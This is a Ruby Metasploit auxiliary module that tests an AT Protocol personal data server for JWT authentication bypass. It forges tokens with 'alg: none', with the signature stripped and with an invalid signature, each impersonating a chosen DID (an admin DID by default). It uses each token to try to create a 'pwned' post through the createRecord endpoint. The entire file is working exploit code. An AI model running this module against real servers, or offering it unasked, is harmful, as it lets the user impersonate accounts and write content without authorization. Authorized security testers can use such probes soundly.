##
# This module requires Metasploit: https://metasploit.com/download
##

require 'base64'
require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'AT Protocol JWT Authentication Bypass Prober',
      'Description'    => %q{
        This module attempts to bypass JWT authentication on an AT Protocol PDS.
        It tests for:
        1. "alg": "none" vulnerability
        2. Signature stripping (removing the signature part)
        3. Invalid signature acceptance
      },
      'Author'         => ['OpenCode'],
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [true, 'The base path to the PDS', '/']),
      OptString.new('DID', [true, 'Target DID to impersonate', 'did:plc:admin'])
    ])
  end

  def run
    @did = datastore['DID']
    
    print_status("Probing JWT bypass on #{peer} for DID: #{@did}")

    test_alg_none
    test_sig_strip
    test_invalid_sig
  end

  def test_alg_none
    print_status("Testing 'alg': 'none'...")
    
    header = { "alg" => "none", "typ" => "JWT" }
    payload = { "sub" => @did, "iss" => "https://pds.example.com", "iat" => Time.now.to_i, "exp" => Time.now.to_i + 3600 }
    
    token = "#{jwt_encode(header)}.#{jwt_encode(payload)}."
    
    check_access(token, "'alg': 'none'")
  end

  def test_sig_strip
    print_status("Testing signature stripping...")
    
    header = { "alg" => "ES256", "typ" => "JWT" }
    payload = { "sub" => @did, "iss" => "https://pds.example.com", "iat" => Time.now.to_i, "exp" => Time.now.to_i + 3600 }
    
    token = "#{jwt_encode(header)}.#{jwt_encode(payload)}."
    
    check_access(token, "Signature Stripping")
  end

  def test_invalid_sig
    print_status("Testing invalid signature...")
    
    header = { "alg" => "ES256", "typ" => "JWT" }
    payload = { "sub" => @did, "iss" => "https://pds.example.com", "iat" => Time.now.to_i, "exp" => Time.now.to_i + 3600 }
    
    token = "#{jwt_encode(header)}.#{jwt_encode(payload)}.invalidsig"
    
    check_access(token, "Invalid Signature")
  end

  def check_access(token, method_name)
    # Try a privileged action, like creating a record
    # Note: This is a probe. If the server validates properly, it should return 401.
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'xrpc', 'com.atproto.repo.createRecord'),
      'headers' => {
        'Authorization' => "Bearer #{token}",
        'Content-Type'  => 'application/json'
      },
      'data' => { "collection" => "app.bsky.feed.post", "repo" => @did, "record" => { "text" => "pwned", "createdAt" => Time.now.iso8601 } }.to_json
    })

    if res
      if res.code == 200
        print_good("VULNERABLE: Accepted #{method_name}!")
      elsif res.code == 401
        print_status("Secure: Rejected #{method_name} (401 Unauthorized)")
      else
        print_status("Server returned #{res.code} for #{method_name}")
      end
    else
      print_error("No response from server")
    end
  end

  def jwt_encode(data)
    Base64.urlsafe_encode64(data.to_json, padding: false)
  end
end
